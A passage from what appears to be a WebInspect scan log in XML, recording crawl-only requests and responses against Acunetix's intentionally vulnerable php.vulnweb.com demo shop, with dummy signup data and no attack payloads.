requestId="0869F21692BB2044AC7BD1684E8C01E3"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="0869F21692BB2044AC7BD1684E8C01E3"><![CDATA[POST /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/product.php?pic=5
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="0869F21692BB2044AC7BD1684E8C01E3";PSID="CB7B12B9974E5BAE8896C397844A8F6D";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c4184c4b";
X-Request-Memo: ID="a3e54650";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

price=460&addcart=5]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:58 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="0869F21692BB2044AC7BD1684E8C01E3"><Method>POST</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>price=460&amp;addcart=5</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/product.php?pic=5</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>19</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="0869F21692BB2044AC7BD1684E8C01E3";PSID="CB7B12B9974E5BAE8896C397844A8F6D";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c4184c4b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a3e54650";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:58 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="793A823C2E6F80ADC40DEDD5432FE66A"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid&amp;pp=12&amp;aaaa=Submit</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="793A823C2E6F80ADC40DEDD5432FE66A"><![CDATA[GET /hpp/params.php?p=valid&pp=12&aaaa=Submit HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="793A823C2E6F80ADC40DEDD5432FE66A";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="7dc06fd6";
X-Request-Memo: ID="6251875a";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:58 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 7

valid12]]></RawResponse><Request id="793A823C2E6F80ADC40DEDD5432FE66A"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid&amp;pp=12&amp;aaaa=Submit</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid</Value></Query><Query><Name>pp</Name><Value>12</Value></Query><Query><Name>aaaa</Name><Value>Submit</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="793A823C2E6F80ADC40DEDD5432FE66A";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="7dc06fd6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6251875a";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid12]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:58 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>7</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="553EDC90FC6DCEBD97AD652FC78258EB"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="553EDC90FC6DCEBD97AD652FC78258EB"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="553EDC90FC6DCEBD97AD652FC78258EB";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="71";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a8f5e7f9";
X-Request-Memo: ID="b3050368";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=12345&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:59 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 784

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 12345</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="553EDC90FC6DCEBD97AD652FC78258EB"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=12345&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>157</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="553EDC90FC6DCEBD97AD652FC78258EB";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="71";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a8f5e7f9";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b3050368";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 12345</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:59 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>784</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="4115529F1CC42E0F7E7F734D41F980BB"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="4115529F1CC42E0F7E7F734D41F980BB"><![CDATA[GET /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="4115529F1CC42E0F7E7F734D41F980BB";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="FormAction";Locations="HtmlNode";NodeName="form";Source="StaticParser";tid="73";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ffe5d2a6";
X-Request-Memo: ID="2ec6f366";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:59 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 415

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	</div>
</body>
</html>
]]></RawResponse><Request id="4115529F1CC42E0F7E7F734D41F980BB"><Method>GET</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="4115529F1CC42E0F7E7F734D41F980BB";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="FormAction";Locations="HtmlNode";NodeName="form";Source="StaticParser";tid="73";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ffe5d2a6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="2ec6f366";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	</div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:59 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>415</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="FAF765E4B6181822E8C9C961F9569838"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="FAF765E4B6181822E8C9C961F9569838"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
